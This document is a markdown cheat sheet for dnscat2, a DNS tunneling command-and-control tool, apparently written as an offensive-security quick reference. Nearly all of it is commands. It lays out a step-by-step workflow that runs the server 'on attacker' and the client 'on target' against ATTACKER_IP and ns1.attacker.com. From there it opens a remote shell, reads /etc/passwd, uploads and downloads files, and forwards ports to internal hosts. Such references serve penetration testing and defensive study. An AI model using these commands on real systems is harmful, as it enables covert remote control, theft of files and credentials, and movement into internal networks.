---
title: "dnscat2 CHEATSHEET"
description: "Quick reference for dnscat2 DNS tunneling commands"
---

# dnscat2 CHEATSHEET

## Server

```bash
# Basic server
ruby dnscat2.rb example.com

# With secret key
ruby dnscat2.rb --secret MySecretKey example.com

# Direct connection mode
ruby dnscat2.rb --dns server=0.0.0.0,port=5353

# Allow unencrypted
ruby dnscat2.rb --security=open example.com

# Multiple domains
ruby dnscat2.rb domain1.com domain2.com
```

## Client

```bash
# Basic connection
./dnscat2 example.com

# With secret key
./dnscat2 --secret MySecretKey example.com

# Direct connection
./dnscat2 --dns server=ATTACKER_IP,port=5353

# Disable encryption
./dnscat2 --no-encryption example.com
```

## Server Interactive Commands

```
# List sessions
dnscat2> windows

# Interact with session
dnscat2> session -i 1

# Kill session
dnscat2> kill 2

# Set security mode
dnscat2> set security=authenticated

# Set secret
dnscat2> set secret=NewSecret

# Start new listener
dnscat2> start --dns=port=53532,domain=newdomain.com

# Help
dnscat2> help
```

## Command Session Commands

```
# Create shell
command session 1> shell

# Execute command
command session 1> exec cmd.exe

# Upload file
command session 1> upload /local/file /remote/file

# Download file
command session 1> download /remote/file /local/file

# Port forwarding
command session 1> listen 4444 target_host:80
command session 1> listen 127.0.0.1:2222 10.10.10.10:22

# Ping (test connectivity)
command session 1> ping

# Background session
Ctrl+Z
```

## Shell Session Commands

```
# Type commands directly
sh> whoami
sh> id
sh> cat /etc/passwd

# Exit shell
sh> exit
```

## Security Modes

```
set security=encrypted       # Default: auto-negotiated encryption
set security=authenticated   # Require pre-shared key
set security=open            # No encryption (dangerous)
```

## Common Flags

### Server Flags

| Flag | Description |
|------|-------------|
| `--dns SERVER` | DNS listen address |
| `--secret KEY` | Pre-shared secret |
| `--security MODE` | Security mode |
| `--auto_attach` | Auto-attach to sessions |

### Client Flags

| Flag | Description |
|------|-------------|
| `--dns SERVER` | DNS server to use |
| `--secret KEY` | Pre-shared secret |
| `--no-encryption` | Disable encryption |
| `--ping` | Test connectivity |

## DNS Server Setup

```bash
# Add NS record for your domain
# tunnel.example.com -> ns1.attacker.com

# Add A record
# ns1.attacker.com -> ATTACKER_IP

# Verify
dig ns tunnel.example.com
dig TXT tunnel.example.com
```

## Practical Workflow

```bash
# 1. Start server on attacker
ruby dnscat2.rb --secret MySecretKey tunnel.example.com

# 2. Start client on target
./dnscat2 --secret MySecretKey tunnel.example.com

# 3. On server, list sessions
dnscat2> windows

# 4. Interact with command session
dnscat2> session -i 1

# 5. Create shell
command session 1> shell

# 6. Set up port forwarding
command session 1> listen 2222 10.0.0.5:22
```
